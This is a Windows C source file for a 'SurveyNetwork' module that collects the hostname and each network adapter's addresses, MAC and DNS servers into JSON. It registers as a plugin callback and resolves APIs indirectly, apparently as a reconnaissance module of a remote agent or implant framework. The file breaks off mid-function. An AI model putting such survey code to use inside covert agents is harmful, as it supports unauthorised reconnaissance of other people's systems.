#include "Internal_Functions.h"
#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_SurveyNetwork.h"


// Global variables
cJSON* g_lpJsonSurveyNetworkConfig = NULL;


DWORD _SurveyNetworkGetHostname(cJSON* lpJsonSurveyNetworkResponseResult)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonComputerName = NULL;

	CHAR	szComputerName[MAX_PATH];
	DWORD	dwComputerNameSize = MAX_PATH;
	
	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("start"));

			if ( NULL == lpJsonSurveyNetworkResponseResult )
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyNetworkResponseResult is NULL")
				);
				__leave;
			}

			ZeroMemory(szComputerName, MAX_PATH);
			if ( ERROR_SUCCESS != m_SurveyNetwork_gethostname(szComputerName, dwComputerNameSize) )
			{
				dwErrorCode = DNS_ERROR_INVALID_NAME;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("gethostname( %p, %d ) failed.(%08x)"),
					szComputerName, 
					dwComputerNameSize,
					dwErrorCode
				);
				__leave;
			}

			lpJsonComputerName = cJSON_CreateString(szComputerName);
			if (NULL == lpJsonComputerName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonComputerName = cJSON_CreateString failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonSurveyNetworkResponseResult, SurveyNetwork_Response_ComputerName, lpJsonComputerName);

		} // end try-finally
		__finally
		{

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}

#define WORKING_BUFFER_SIZE 15000
#define MAX_TRIES 3
DWORD _GetAdapterInfo(cJSON* lpJsonSurveyNetworkResponseResult)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	DWORD	dwSize = 0;
	DWORD	dwAddressIndex = 0;
	DWORD	dwUnicastAddressIndex = 0;
	DWORD	dwDNSAddressIndex = 0;
	// Set the flags to pass to GetAdaptersAddresses
	ULONG	flags			= GAA_FLAG_INCLUDE_PREFIX;
	// default to unspecified address family (both)
	ULONG	family			= AF_UNSPEC;
	LPVOID	lpMsgBuf		= NULL;
	ULONG	outBufLen		= 0;
	ULONG	Iterations		= 0;

	PIP_ADAPTER_ADDRESSES			pAddresses = NULL;
	PIP_ADAPTER_ADDRESSES			pCurrAddresses	= NULL;
	PIP_ADAPTER_UNICAST_ADDRESS		pUnicast		= NULL;
	PIP_ADAPTER_ANYCAST_ADDRESS		pAnycast		= NULL;
	PIP_ADAPTER_MULTICAST_ADDRESS	pMulticast		= NULL;
	IP_ADAPTER_DNS_SERVER_ADDRESS	*pDnServer		= NULL;
	IP_ADAPTER_PREFIX				*pPrefix		= NULL;

	DWORD	dwAdapterIndex = 0;

	cJSON*	lpJsonAdapters = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("start"));

			if (NULL == lpJsonSurveyNetworkResponseResult)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyNetworkResponseResult is NULL")
				);
				__leave;
			}


			// Allocate a 15 KB buffer to start with.
			outBufLen = WORKING_BUFFER_SIZE;

			do {
				DBGPRINT(DEBUG_VERBOSE, TEXT("outBufLen: %d"), outBufLen);
				dwErrorCode = ALLOC(outBufLen, (LPVOID*)(&pAddresses));
				if (ERROR_SUCCESS != dwErrorCode)
				{
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("ALLOC( %d, %p ) failed.(%08x)"),
						outBufLen, (LPVOID*)(&pAddresses),
						dwErrorCode
					);
					__leave;
				}
				if (pAddresses == NULL) {
					dwErrorCode = ERROR_OUTOFMEMORY;
					DBGPRINT( DEBUG_ERROR, TEXT("pAddresses is NULL"));
					__leave;
				}

				dwErrorCode =
					m_SurveyNetwork_GetAdaptersAddresses(
						family, 
						flags, 
						NULL, 
						pAddresses, 
						&outBufLen
					);
				if (dwErrorCode == ERROR_BUFFER_OVERFLOW) {
					FREE(pAddresses);
					pAddresses = NULL;
				}
				else {
					DBGPRINT(
						DEBUG_VERBOSE, 
						TEXT("m_SurveyNetwork_GetAdaptersAddresses(%d) returned %08x"), 
						outBufLen, 
						dwErrorCode
					);
					break;
				}

				Iterations++;

			} while ((dwErrorCode == ERROR_BUFFER_OVERFLOW) && (Iterations < MAX_TRIES));

			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("GetAdaptersAddresses( %08x, %08x, %p, %p, %p ) failed.(%08x)"),
					family,
					flags,
					NULL,
					pAddresses,
					&outBufLen,
					dwErrorCode
				);
				__leave;
			}
			
			DBGPRINT(DEBUG_VERBOSE, TEXT("outBufLen:  %d"), outBufLen);
			DBGPRINT(DEBUG_VERBOSE, TEXT("pAddresses: %p"), pAddresses);


			// If successful, output some information from the data we received

			// Create a JSON array of adapter objects
			lpJsonAdapters = cJSON_AddArrayToObject(lpJsonSurveyNetworkResponseResult, SurveyNetwork_Response_Adapters);
			if (NULL == lpJsonAdapters)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonAdapters = cJSON_AddArrayToObject(%p,%S) failed."),
					lpJsonSurveyNetworkResponseResult,
					SurveyNetwork_Response_Adapters
				);
				__leave;
			}

			pCurrAddresses = pAddresses;
			while (NULL != pCurrAddresses)
			{
				CHAR szTemp[MAX_PATH + 1];
				cJSON* lpJsonAdapter = NULL;
				cJSON* lpJsonAdapterInterfaceType = NULL;
				cJSON* lpJsonAdapterInterfaceIndex = NULL;
				cJSON* lpJsonAdapterOperatingStatus = NULL;
				cJSON* lpJsonAdapterFriendlyName = NULL;
				cJSON* lpJsonAdapterDescription = NULL;
				cJSON* lpJsonAdapterPhysicalAddress = NULL;
				cJSON* lpJsonAdapterUnicastAddresses = NULL;
				cJSON* lpJsonAdapterDNSSuffix = NULL;
				cJSON* lpJsonAdapterDNSServerAddresses = NULL;


				DBGPRINT(DEBUG_VERBOSE, TEXT("Adapter[%d]:"), dwAdapterIndex);
				lpJsonAdapter = cJSON_CreateObject();
				if (NULL == lpJsonAdapter)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapter = cJSON_CreateObject() failed.\n")
					);
					__leave;
				}

				DBGPRINT(DEBUG_VERBOSE, TEXT("  IfType:  %ld"), pCurrAddresses->IfType);
				lpJsonAdapterInterfaceType = cJSON_CreateNumber(pCurrAddresses->IfType);
				if (NULL == lpJsonAdapterInterfaceType)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterInterfaceType = cJSON_CreateNumber failed.\n")
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterInterfaceType, lpJsonAdapterInterfaceType);

				DBGPRINT(DEBUG_VERBOSE, TEXT("  IfIndex:  %u"), pCurrAddresses->IfIndex);
				lpJsonAdapterInterfaceIndex = cJSON_CreateNumber(pCurrAddresses->IfIndex);
				if (NULL == lpJsonAdapterInterfaceIndex)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterInterfaceIndex = cJSON_CreateNumber failed.\n")
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterInterfaceIndex, lpJsonAdapterInterfaceIndex);

				DBGPRINT(DEBUG_VERBOSE, TEXT("  OperStatus:  %d"), pCurrAddresses->OperStatus);
				lpJsonAdapterOperatingStatus = cJSON_CreateNumber(pCurrAddresses->OperStatus);
				if (NULL == lpJsonAdapterOperatingStatus)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterOperatingStatus = cJSON_CreateNumber failed.\n")
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterOperatingStatus, lpJsonAdapterOperatingStatus);

				DBGPRINT(DEBUG_VERBOSE, TEXT("  FriendlyName:  %s"), pCurrAddresses->FriendlyName);
				ZeroMemory(szTemp, MAX_PATH+1);
				if (-1 == wcstombs(szTemp, pCurrAddresses->FriendlyName, MAX_PATH))
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("wcstombs( %p, %p, %d) failed.\n"),
						szTemp, pCurrAddresses->FriendlyName, MAX_PATH
					);
					__leave;
				}
				lpJsonAdapterFriendlyName = cJSON_CreateString(szTemp);
				if (NULL == lpJsonAdapterFriendlyName)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterFriendlyName = cJSON_CreateString failed.\n")
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterFriendlyName, lpJsonAdapterFriendlyName);

				DBGPRINT(DEBUG_VERBOSE, TEXT("  Description:  %s"), pCurrAddresses->Description);
				ZeroMemory(szTemp, MAX_PATH + 1);
				if (-1 == wcstombs(szTemp, pCurrAddresses->Description, MAX_PATH))
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("wcstombs( %p, %p, %d) failed.\n"),
						szTemp, pCurrAddresses->Description, MAX_PATH
					);
					__leave;
				}
				lpJsonAdapterDescription = cJSON_CreateString(szTemp);
				if (NULL == lpJsonAdapterDescription)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterDescription = cJSON_CreateString failed.\n")
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterDescription, lpJsonAdapterDescription);


				DBGPRINT(DEBUG_VERBOSE, TEXT("  PhysicalAddressLength:  %d"), pCurrAddresses->PhysicalAddressLength);
				DBGPRINT(DEBUG_VERBOSE, TEXT("  PhysicalAddress:  %02x-%02x-%02x-%02x-%02x-%02x-%02x-%02x"), 
					pCurrAddresses->PhysicalAddress[0],
					pCurrAddresses->PhysicalAddress[1],
					pCurrAddresses->PhysicalAddress[2],
					pCurrAddresses->PhysicalAddress[3],
					pCurrAddresses->PhysicalAddress[4],
					pCurrAddresses->PhysicalAddress[5],
					pCurrAddresses->PhysicalAddress[6],
					pCurrAddresses->PhysicalAddress[7]
				);
				lpJsonAdapterPhysicalAddress = cJSON_CreateBytes(pCurrAddresses->PhysicalAddress, pCurrAddresses->PhysicalAddressLength);
				if (NULL == lpJsonAdapterPhysicalAddress)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterPhysicalAddress = cJSON_CreateBytes failed.\n")
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterPhysicalAddress, lpJsonAdapterPhysicalAddress);



				// Create a JSON array of unicast address objects
				lpJsonAdapterUnicastAddresses = cJSON_AddArrayToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterUnicastAddresses);
				if (NULL == lpJsonAdapterUnicastAddresses)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterUnicastAddresses = cJSON_AddArrayToObject(%p,%S) failed."),
						lpJsonAdapter,
						SurveyNetwork_Response_AdapterUnicastAddresses
					);
					__leave;
				}

				pUnicast = pCurrAddresses->FirstUnicastAddress;
				if (pUnicast != NULL) 
				{
					dwUnicastAddressIndex = 0;
					for (pUnicast = pCurrAddresses->FirstUnicastAddress; pUnicast != NULL; pUnicast = pUnicast->Next)
					{
						cJSON* lpJsonAdapterUnicastAddress = NULL;

						DBGPRINT(DEBUG_VERBOSE, TEXT("  UnicastAddress[%d].iSockaddrLength:        %d"), dwUnicastAddressIndex, pUnicast->Address.iSockaddrLength);
						DBGPRINT(DEBUG_VERBOSE, TEXT("  UnicastAddress[%d].lpSockaddr->sa_family:  %04x"), dwUnicastAddressIndex, pUnicast->Address.lpSockaddr->sa_family);
						DBGPRINT(DEBUG_VERBOSE, TEXT("  UnicastAddress[%d].lpSockaddr->sa_data:    %d.%d.%d.%d"), 
							dwUnicastAddressIndex, 
							(BYTE)(pUnicast->Address.lpSockaddr->sa_data[2]),
							(BYTE)(pUnicast->Address.lpSockaddr->sa_data[3]),
							(BYTE)(pUnicast->Address.lpSockaddr->sa_data[4]),
							(BYTE)(pUnicast->Address.lpSockaddr->sa_data[5])

						);
						lpJsonAdapterUnicastAddress = cJSON_CreateBytes((LPBYTE)(pUnicast->Address.lpSockaddr), pUnicast->Address.iSockaddrLength);
						if (NULL == lpJsonAdapterUnicastAddress)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonAdapterUnicastAddress = cJSON_CreateBytes failed.\n")
							);
							__leave;
						}

						// Add current unicast address to overall unicast addresses list
						cJSON_AddItemToArray(lpJsonAdapterUnicastAddresses, lpJsonAdapterUnicastAddress);

						dwUnicastAddressIndex++;
					}
				}
				else
				{
					DBGPRINT(DEBUG_VERBOSE, TEXT("  No Unicast Addresses!"));
				}

				DBGPRINT(DEBUG_VERBOSE, TEXT("  DnsSuffix:  %s"), pCurrAddresses->DnsSuffix);
				ZeroMemory(szTemp, MAX_PATH + 1);
				if (-1 == wcstombs(szTemp, pCurrAddresses->DnsSuffix, MAX_PATH))
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("wcstombs( %p, %p, %d) failed.\n"),
						szTemp, pCurrAddresses->DnsSuffix, MAX_PATH
					);
					__leave;
				}
				lpJsonAdapterDNSSuffix = cJSON_CreateString(szTemp);
				if (NULL == lpJsonAdapterDNSSuffix)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterDNSSuffix = cJSON_CreateString failed.\n")
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterDNSSuffix, lpJsonAdapterDNSSuffix);


				// Create a JSON array of DNS server address objects
				lpJsonAdapterDNSServerAddresses = cJSON_AddArrayToObject(lpJsonAdapter, SurveyNetwork_Response_AdapterDNSAddresses);
				if (NULL == lpJsonAdapterDNSServerAddresses)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAdapterDNSServerAddresses = cJSON_AddArrayToObject(%p,%S) failed."),
						lpJsonAdapter,
						SurveyNetwork_Response_AdapterDNSAddresses
					);
					__leave;
				}

				pDnServer = pCurrAddresses->FirstDnsServerAddress;
				if ( NULL != pDnServer ) 
				{
					dwDNSAddressIndex = 0;
					for (pDnServer = pCurrAddresses->FirstDnsServerAddress; pDnServer != NULL; pDnServer = pDnServer->Next)
					{
						cJSON* lpJsonAdapterDNSServerAddress = NULL;

						DBGPRINT(DEBUG_VERBOSE, TEXT("  DNSAddresses[%d].iSockaddrLength:        %d"), dwDNSAddressIndex, pDnServer->Address.iSockaddrLength);
						DBGPRINT(DEBUG_VERBOSE, TEXT("  DNSAddresses[%d].lpSockaddr->sa_family:  %04x"), dwDNSAddressIndex, pDnServer->Address.lpSockaddr->sa_family);
						DBGPRINT(DEBUG_VERBOSE, TEXT("  DNSAddresses[%d].lpSockaddr->sa_data:    %d.%d.%d.%d"),
							dwDNSAddressIndex,
							(BYTE)(pDnServer->Address.lpSockaddr->sa_data[2]),
							(BYTE)(pDnServer->Address.lpSockaddr->sa_data[3]),
							(BYTE)(pDnServer->Address.lpSockaddr->sa_data[4]),
							(BYTE)(pDnServer->Address.lpSockaddr->sa_data[5])

						);

						lpJsonAdapterDNSServerAddress = cJSON_CreateBytes((LPBYTE)(pDnServer->Address.lpSockaddr), pDnServer->Address.iSockaddrLength);
						if (NULL == lpJsonAdapterDNSServerAddress)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonAdapterDNSServerAddress = cJSON_CreateBytes failed.\n")
							);
							__leave;
						}

						// Add current dns server address to overall dns server addresses list
						cJSON_AddItemToArray(lpJsonAdapterDNSServerAddresses, lpJsonAdapterDNSServerAddress);

						dwDNSAddressIndex++;
					}
				}
				else
				{
					DBGPRINT(DEBUG_VERBOSE, TEXT("  No DNS Server Addresses!"));
				}
				
				// Add current adapter to overall adapters list
				cJSON_AddItemToArray(lpJsonAdapters, lpJsonAdapter);

				dwAdapterIndex++;

				pCurrAddresses = pCurrAddresses->Next;
			}

			//(*lpdwBufferSize) = dwBufferIndex;

		} // end try-finally
		__finally
		{
			if (NULL != pAddresses)
			{
				FREE(pAddresses);
				pAddresses = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyNetworkInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonSurveyNetworkInitializeInput = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	cJSON*	lpJsonSurveyNetworkInitializeOutput = NULL;
	CHAR*	szSurveyNetworkOutput = NULL;
	DWORD	dwSurveyNetworkOutputSize = 0;

	WORD	wVersionRequested;
	WSADATA wsaData;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}


			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonSurveyNetworkInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonSurveyNetworkInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_lpJsonSurveyNetworkConfig = lpJsonSurveyNetworkInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonSurveyNetworkInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_SurveyNetwork_Ws2_32_Functions()"));
			dwErrorCode = Initialize_SurveyNetwork_Ws2_32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_SurveyNetwork_Ws2_32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("InitializeIphlpapiFunctions()"));
			dwErrorCode = InitializeIphlpapiFunctions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("InitializeIphlpapiFunctions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


			/********************************************************************************
				Perform additional initialization actions
			********************************************************************************/
			wVersionRequested = MAKEWORD(2, 2);

			dwErrorCode = m_SurveyNetwork_WSAStartup(wVersionRequested, &wsaData);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR, 
					TEXT("m_SurveyNetwork_WSAStartup(%04x, %p) failed.(%08x)"), 
					wVersionRequested, 
					&wsaData,
					dwErrorCode
				);
				__leave;
			}


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyNetwork_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_lpJsonSurveyNetworkConfig,
				SurveyNetwork_Request,
				SurveyNetworkCallbackInterface
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_lpJsonSurveyNetworkConfig,
					SurveyNetwork_Request,
					SurveyNetworkCallbackInterface
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyNetwork_Request was successful."));
			}

			
			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szSurveyNetworkOutput = cJSON_Print(lpJsonSurveyNetworkInitializeOutput);
			//if (NULL == szSurveyNetworkOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonSurveyNetworkInitializeOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyNetworkOutput:     %p"), szSurveyNetworkOutput);
			////printf("szSurveyNetworkOutput:\n%s\n", szSurveyNetworkOutput);
			//dwSurveyNetworkOutputSize = (DWORD)strlen(szSurveyNetworkOutput);

			//(*lppOutputBuffer) = (LPBYTE)szSurveyNetworkOutput;
			//(*lpdwOutputBufferSize) = dwSurveyNetworkOutputSize;

		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonSurveyNetworkInitializeInput)
			{
				cJSON_Delete(lpJsonSurveyNetworkInitializeInput);
				lpJsonSurveyNetworkInitializeInput = NULL;
			}
			if (NULL != lpJsonSurveyNetworkInitializeOutput)
			{
				cJSON_Delete(lpJsonSurveyNetworkInitializeOutput);
				lpJsonSurveyNetworkInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyNetworkFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szSurveyNetworkInput = NULL;
	DWORD	dwSurveyNetworkInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szSurveyNetworkOutput = NULL;
	DWORD	dwSurveyNetworkOutputSize = 0;
	cJSON*	lpJsonSurveyNetworkOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szSurveyNetworkInput = (char*)lpInputBuffer;
			//dwSurveyNetworkInputSize = dwInputBufferSize;


			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyNetwork_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_lpJsonSurveyNetworkConfig,
				SurveyNetwork_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_lpJsonSurveyNetworkConfig,
					SurveyNetwork_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyNetwork_Request was successful."));
			}


			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/
			dwTempErrorCode = m_SurveyNetwork_WSACleanup();
			if (ERROR_SUCCESS != dwTempErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_SurveyNetwork_WSACleanup() failed.(%08x)"),
					dwTempErrorCode
				);
				//__leave;
			}

			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_SurveyNetwork_Ws2_32_Functions()"));
			dwErrorCode = Finalize_SurveyNetwork_Ws2_32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_SurveyNetwork_Ws2_32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("FinalizeIphlpapiFunctions()"));
			dwErrorCode = FinalizeIphlpapiFunctions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("FinalizeIphlpapiFunctions() failed.(%08x)"), dwErrorCode);
				__leave;
			}
			
		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_lpJsonSurveyNetworkConfig)
			{
				cJSON_Delete(g_lpJsonSurveyNetworkConfig);
				g_lpJsonSurveyNetworkConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyNetworkCallbackInterface(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szSurveyNetworkInput = NULL;
	DWORD	dwSurveyNetworkInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonSurveyNetworkRequestEntries = NULL;
	cJSON*	lpJsonSurveyNetworkRequestEntry = NULL;

	CHAR*	szSurveyNetworkOutput = NULL;
	DWORD	dwSurveyNetworkOutputSize = 0;
	cJSON*	lpJsonSurveyNetworkOutput = NULL;
	//cJSON*	lpJsonSurveyNetworkResponse = NULL;
	cJSON*	lpJsonSurveyNetworkResponseResults = NULL;
	cJSON*	lpJsonSurveyNetworkResponseResult = NULL;

	DWORD	dwRequestIndex = 0;


	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
